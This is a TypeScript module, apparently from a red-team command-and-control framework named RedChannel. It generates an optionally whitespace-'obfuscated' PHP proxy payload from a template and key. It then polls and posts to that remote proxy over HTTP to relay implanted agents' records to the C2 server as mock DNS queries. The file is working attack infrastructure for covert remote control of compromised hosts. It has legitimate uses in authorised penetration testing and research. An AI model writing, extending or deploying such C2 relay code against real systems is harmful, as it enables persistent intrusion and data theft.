import axios from "axios";
import querystring from "querystring";
import * as fs from "fs";
import { Constants, emsg } from "../utils";
import { Module } from "./base";
import Logger from "../lib/logger";
import { RedChannelConfig } from "../lib/config";
import { C2AnswerType, C2MessageRequest, C2MessageResponse } from "../lib/redchannel";

const PROXY_PAYLOAD_PATH = "payloads/proxy.php";

export enum ProxyStatus {
    ERROR_KEY_MISMATCH = "ERR 1",
    ERROR_KEY_MISSING = "ERR 2",
    ERROR_INVALID_AGENT_ID = "ERR 3",
    ERROR_INVALID_DATA_SENT = "ERR 5",
    ERROR_INVALID_REQUEST = "ERR 6",
    ERROR_WRITING_TO_AGENT_STORAGE = "ERR 7",
    ERROR_WRITING_TO_C2_STORAGE = "ERR 8",
    OK_RECEIVED_FROM_AGENT = "OK PA",
    OK_RECEIVED_FROM_C2 = "OK PC",
    OK_NO_DATA = "OK ND",
}

export default class ProxyModule implements Module {
    fetchTimer: NodeJS.Timeout | null;
    payload: string;
    log: Logger;

    constructor(protected config: RedChannelConfig, protected messageHandler: (request: C2MessageRequest, response: C2MessageResponse) => void, log?: Logger) {
        this.log = log ?? new Logger();

        this.fetchTimer = null;
        this.payload = "";

        // this.defineCommands({
        //     fetch: {
        //         arguments: [],
        //         description: "force a fetch from the proxy",
        //         execute: this.proxyFetch,
        //     },
        //     generate: {
        //         arguments: [],
        //         description: "generate proxy payload with the specified key",
        //         execute: this.run,
        //     },
        //     start: {
        //         arguments: [],
        //         description: "start the proxy checkin",
        //         execute: this.proxyFetchLoop,
        //     },
        //     stop: {
        //         arguments: [],
        //         description: "stop the proxy checkin",
        //         execute: () => {
        //             if (this.fetchTimer) {
        //                 clearTimeout(this.fetchTimer);
        //             }
        //             return { message: "stopping the proxy checkin" };
        //         },
        //     },
        //     payload: {
        //         arguments: [],
        //         description: "get the current generated payload",
        //         execute: () => {
        //             return { message: this.payload };
        //         },
        //     },
        //     "set url": {
        //         arguments: ["<url>"],
        //         description: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
        //         validateRegex: Constants.VALID_URL_REGEX,
        //         execute: (params: string) => {
        //             this.config.proxy.url = params;
        //         },
        //     },
        //     "set enabled": {
        //         arguments: ["<1|0>"],
        //         description: "enable or disable proxy communication channel, remember to 'start' after enabling",
        //         execute: (params: string) => {
        //             this.config.proxy.enabled = params !== "0" && params !== "false" ? true : false;
        //         },
        //     },
        //     "set obfuscate_payload": {
        //         arguments: ["<1|0>"],
        //         description: "enable or disable payload obfuscation",
        //         execute: (params: string) => {
        //             this.config.proxy.obfuscate_payload = params !== "0" && params !== "false" ? true : false;
        //         },
        //     },
        //     "set key": {
        //         arguments: ["<key>"],
        //         description: "key to use for proxy communication",
        //         execute: (params: string) => {
        //             this.config.proxy.key = params;
        //         },
        //     },
        //     "set interval": {
        //         arguments: ["<ms>"],
        //         description: "how often to fetch data from proxy, in ms",
        //         execute: (params: string) => {
        //             this.config.proxy.interval = Number(params) || this.config.proxy.interval;
        //         },
        //     },
        // });
    }

    proxyInit() {
        const proxyConfig = this.config.proxy;
        if (proxyConfig.enabled) {
            this.log.info(`c2-proxy enabled, checkin at interval: ${proxyConfig.interval}ms`);
            this.proxyFetchLoop();
        } else {
            this.log.info("c2-proxy is disabled");
        }
    }

    execute(): void {
        if (!this.config.proxy.key) throw new Error("proxy key is required, see 'help'");

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync(PROXY_PAYLOAD_PATH);
            proxyPhp = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const proxyErrorKeys = Object.keys(ProxyStatus);
        for (const keyIndex in proxyErrorKeys) {
            const re = new RegExp(`\\[${proxyErrorKeys[keyIndex]}\\]`, "g");
            proxyPhp = proxyPhp.replace(re, ProxyStatus[proxyErrorKeys[keyIndex]]);
        }
        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");

        // "obfuscation"
        if (this.config.proxy.obfuscate_payload) {
            proxyPhp = proxyPhp.replace(/\n/g, "");
            proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
        }

        this.payload = `<?php ${proxyPhp} ?>`;
        this.log?.info(`proxy payload set: \n${this.payload}`);
    }

    async sendToProxy(agentId: string, records: string[]) {
        const recordsString = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: recordsString,
            k: this.config.proxy.key,
            i: agentId,
            p: "c",
        };

        try {
            const res = await axios.post(this.config.proxy.url, querystring.stringify(data));
            const message = `proxy send response: ${res.data}`;
            this.log.debug(message);
        } catch (ex) {
            const message = `proxy send failed: ${emsg(ex)}`;
            this.log.error(message);
        }
        return;
    }

    getFromProxy() {
        if (!this.config.proxy.enabled) {
            this.log.error("proxy is not enabled: try 'set enabled 1'");
            return;
        }

        if (!this.config.proxy.url) {
            this.log.error("proxy config is missing the url: see 'help'");
            return;
        }
        if (!this.config.proxy.key) {
            this.log.error("proxy config is missing a key: see 'help'");
            return;
        }

        const data = {
            k: this.config.proxy.key,
            f: "a",
        };

        return axios
            .post(this.config.proxy.url, querystring.stringify(data))
            .then((result) => this.processProxyData(result.data))
            .catch((ex) => {
                this.log.error(`proxy fetch failed: ${emsg(ex)}`);
            });
    }

    processProxyData(proxyData: string) {
        // we expect the proxy to respond with ERR 1, or similar
        // this.log.debug(`proxy response:\n${proxyData}`);
        if (proxyData.length < 2) throw new Error(`unexpected response (too small): '${proxyData}'`);

        // everything was ok, but no data from agents in proxy storage
        if (proxyData === ProxyStatus.OK_NO_DATA) return;

        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data: '${proxyData}'`);

        // a known error was throw
        if (Object.values(ProxyStatus).includes(proxyData as ProxyStatus)) {
            const codeName = Object.keys(ProxyStatus)[Object.values(ProxyStatus).indexOf(proxyData as ProxyStatus)];
            throw new Error(`proxy returned code ${codeName}`);
        }

        // grab proxy response and build mock dns queries
        const data = proxyData.replace(/;$/, "").split(";");
        data.forEach((q) => {
            const req: C2MessageRequest = {
                connection: {
                    remoteAddress: this.config.proxy.url,
                    type: C2AnswerType.TYPE_PROXY,
                },
            };
            const res: C2MessageResponse = {
                question: [
                    {
                        type: C2AnswerType.TYPE_PROXY,
                        name: `${q}.${this.config.c2.domain}`,
                    },
                ],
                answer: [],
                end: () => {
                    return;
                },
            };
            this.messageHandler(req, res);
        });
    }

    proxyFetch() {
        this.getFromProxy();
        return { message: "fetching data from proxy..." };
    }

    proxyEnable() {
        const message = this.config.proxy.enabled ? `starting proxy checkin at interval: ${this.config.proxy.interval}ms` : "stopping proxy checkin";

        this.proxyFetchLoop();
        return { message: message };
    }

    proxyFetchLoop() {
        if (this.fetchTimer) clearTimeout(this.fetchTimer);
        if (!this.config.proxy.enabled) return { message: "proxy is not enabled" };

        if (!this.config.proxy.url) {
            throw new Error("proxy config is missing the url");
        }
        if (!this.config.proxy.key) {
            throw new Error("proxy config is missing a key");
        }

        this.getFromProxy()?.finally(() => {
            this.fetchTimer = setTimeout(() => {
                this.proxyFetchLoop();
            }, this.config.proxy.interval);
        });

        return { message: "starting the proxy checkin loop" };
    }
}
